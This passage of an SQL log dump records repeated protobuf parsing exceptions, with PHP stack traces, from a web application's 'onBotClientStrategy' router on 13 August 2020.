(196, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'G\\xCE\\xDB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'G\\xCE\\xDB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'G\\xCE\\xDB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:53:30'),
(197, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'i\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'i\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'i\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:53:31'),
(198, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'v\\xA9\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'v\\xA9\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'v\\xA9\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:55:28'),
(199, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\',\\xDA\\x81\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\',\\xDA\\x81\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\',\\xDA\\x81\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:56:38'),
(200, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xD9>\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xD9>\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xD9>\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:56:48'),
(201, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xF03^\\xB4\\xFE\\x9DW\\x1AL\\xA1\\xBE\\xA1\\xE7*\\xF7...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xF03^\\xB4\\xFE\\x9DW\\x1AL\\xA1\\xBE\\xA1\\xE7*\\xF7...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xF03^\\xB4\\xFE\\x9DW\\x1AL\\xA1\\xBE\\xA1\\xE7*\\xF7...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:58:22'),
(202, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xF1B\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xF1B\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xF1B\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:58:24'),
(203, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'.\\xDA\\xBD\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'.\\xDA\\xBD\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'.\\xDA\\xBD\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:58:25'),
(204, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'_NW\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'_NW\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'_NW\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:58:27'),
(205, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'I\\xD22\\x9E\\x84\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'I\\xD22\\x9E\\x84\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'I\\xD22\\x9E\\x84\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:58:29'),
(206, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x93\\xEA\\xD2\\xFA\\x84{\\x9C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x93\\xEA\\xD2\\xFA\\x84{\\x9C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x93\\xEA\\xD2\\xFA\\x84{\\x9C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:58:54'),
(207, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x95\\x04\\xB3\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x95\\x04\\xB3\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x95\\x04\\xB3\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:59:48'),
(208, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xD7S\\x8A\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xD7S\\x8A\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xD7S\\x8A\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 07:59:50'),
(209, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:3 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:221\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x13O\\xC2\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x13O\\xC2\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x13O\\xC2\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:00:00'),
(210, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xF3\\xC0,\\x8B\\xFBn\\xC6\\x84\\xC6\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xF3\\xC0,\\x8B\\xFBn\\xC6\\x84\\xC6\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xF3\\xC0,\\x8B\\xFBn\\xC6\\x84\\xC6\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:00:24'),
(211, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\',\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\',\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\',\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:00:44'),
(212, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'g\\x0E\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'g\\x0E\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'g\\x0E\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:01:01'),
(213, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'g\\x0E\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'g\\x0E\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'g\\x0E\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:01:03'),
(214, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x87\\xBBv\\xC9$\\xBE\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x87\\xBBv\\xC9$\\xBE\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x87\\xBBv\\xC9$\\xBE\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:01:48'),
(215, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x87\\xBBv\\xC9$\\xBE\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x87\\xBBv\\xC9$\\xBE\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x87\\xBBv\\xC9$\\xBE\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:01:49'),
(216, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:02:34'),
(217, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:02:35'),
(218, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:1 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:212\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'!\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'!\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'!\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:02:52'),
(219, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:1 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:212\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'!\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'!\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'!\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:02:54'),
(220, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:1 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:212\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'!\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'!\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'!\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:02:55'),
(221, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xB3\\xAEJ\\x94\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xB3\\xAEJ\\x94\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xB3\\xAEJ\\x94\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:03:55'),
(222, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xB3\\xAEJ\\x94\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xB3\\xAEJ\\x94\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xB3\\xAEJ\\x94\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:03:56'),
(223, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xB3\\xAEJ\\x94\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xB3\\xAEJ\\x94\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xB3\\xAEJ\\x94\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:03:58'),
(224, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'D\\xAAy\\xB3>3\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'D\\xAAy\\xB3>3\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'D\\xAAy\\xB3>3\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:04:33'),
(225, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:04:35'),
(226, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:04:38'),
(227, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-13 08:04:42'),
(228, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'{\\xAF\\xB0\\xF5\\xD7\\x83\\xFAKz\\xF4m\\xF3\\xB6\\xBE\\xC2...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'{\\xAF\\xB0\\xF5\\xD7\\x83\\xFAKz\\xF4m\\xF3\\xB6\\xBE\\xC2...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'{\\xAF\\xB0\\xF5\\xD7\\x83\\xFAKz\\xF4m\\xF3\\xB6\\xBE\\xC2...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): 